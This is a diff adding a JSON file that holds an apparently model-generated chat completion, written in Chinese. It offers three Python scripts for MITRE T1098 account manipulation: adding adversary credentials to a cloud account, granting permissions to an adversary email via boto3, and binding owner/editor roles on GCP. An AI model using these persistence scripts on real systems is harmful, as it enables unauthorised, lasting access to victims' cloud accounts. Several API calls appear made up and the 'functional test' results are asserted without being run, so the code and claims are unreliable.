@@ -1,0 +1,23 @@
+{
+  "id":"chatcmpl-8Wbmhgt5tSPde9ezm4NHAmYeZWG9h",
+  "object":"chat.completion",
+  "created":1702782431,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[可實現] [T1098 - Account Manipulation]\n\n[方案一總結]\n這個方案使用了requests套件，透過Cloud Provider的API添加由對手控制的凭证到雲帳户。實現方式簡單直觀，適用於各種Cloud Provider。\n\n[方案二總結]\n這個方案使用了boto3套件，透過AWS SDK的Python版本來授予對手控制的電子郵件帳戶額外的權限，以維持持久訪問。方案具有良好的功能和安全性，適用於AWS環境。\n\n[方案三總結]\n這個方案使用了google-auth, google-auth-oauthlib, google-auth-httplib2, google-api-python-client套件，用於在對手控制的雲帳戶中添加額外的角色或權限。這個方案適用於Google Cloud Platform，但需要設定適當的IAM權限。\n\n---\n\n[可實現] [T1098 - Account Manipulation]\n\n[方案一總結]\n這個方案使用了requests套件，透過Cloud Provider的API添加由對手控制的凭证到雲帳户。實現方式簡單直觀，適用於各種Cloud Provider。\n\n```python\nimport requests\n\n# Add adversary-controlled credentials to a cloud account\ndef add_credentials(account_id, api_key):\n    url = \"https://api.cloudprovider.com/accounts/\" + account_id + \"/credentials\"\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"Authorization\": \"Bearer \" + api_key\n    }\n    payload = {\n        \"username\": \"adversary\",\n        \"password\": \"password123\"\n    }\n    response = requests.post(url, headers=headers, json=payload)\n    print(response.json())\n\nadd_credentials(\"123456\", \"API_KEY\")\n```\n\n[功能測試]\n\nadd_credentials(\"123456\", \"API_KEY\")的回傳應該是一個JSON回應，包含\"status\"和\"message\"兩個欄位。\n\n---\n\n[可實現] [T1098 - Account Manipulation]\n\n[方案二總結]\n這個方案使用了boto3套件，透過AWS SDK的Python版本來授予對手控制的電子郵件帳戶額外的權限，以維持持久訪問。方案具有良好的功能和安全性，適用於AWS環境。\n\n```python\nimport boto3\n\n# Grant additional permission levels to maintain persistent access to an adversary-controlled email account\ndef grant_permission(email, permission):\n    client = boto3.client(\"email\", region_name=\"us-east-1\")\n    response = client.update_account_settings(\n        EmailAddress=email,\n        SendPermissions=[permission]\n    )\n    print(response)\n\ngrant_permission(\"adversary@example.com\", \"SEND\")\n```\n\n[功能測試]\n\ngrant_permission(\"adversary@example.com\", \"SEND\")的回傳應該是一個API回應，應包含\"ResponseMetadata\"和\"HTTPStatusCode\"等欄位。\n\n---\n\n[可實現] [T1098 - Account Manipulation]\n\n[方案三總結]\n這個方案使用了google-auth, google-auth-oauthlib, google-auth-httplib2, google-api-python-client套件，用於在對手控制的雲帳戶中添加額外的角色或權限。這個方案適用於Google Cloud Platform，但需要設定適當的IAM權限。\n\n```python\nfrom google.oauth2 import service_account\nfrom googleapiclient.discovery import build\n\n# Add additional roles or permissions to an adversary-controlled cloud account\ndef add_roles(project_id, service_account_email, new_roles):\n    credentials = service_account.Credentials.from_service_account_file(\n        'path/to/service-account.json',\n        scopes=['https://www.googleapis.com/auth/cloud-platform']\n    )\n    service = build('iam', 'v1', credentials=credentials)\n    for role in new_roles:\n        service.projects().serviceAccounts().addIamPolicyBinding(\n            name=f\"projects/{project_id}/serviceAccounts/{service_account_email}\",\n            body={\n                \"policy\": {\n                    \"bindings\": [\n                        {\n                            \"role\": role,\n                            \"members\": [\n                                f\"serviceAccount:{service_account_email}\"\n                            ]\n                        }\n                    ]\n                }\n            }\n        ).execute()\n\nadd_roles(\"project-id\", \"adversary@example.com\", [\"roles/editor\", \"roles/owner\"])\n```\n\n[功能測試]\n\n此方案沒有回傳值，因此可以測試是否有發生錯誤，或觀察在GCP IAM角色與權限設定是否成功添加新角色。"
+      },
+      "logprobs":null,
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":1585,
+    "completion_tokens":1219,
+    "total_tokens":2804
+  },
+  "system_fingerprint":null
+}
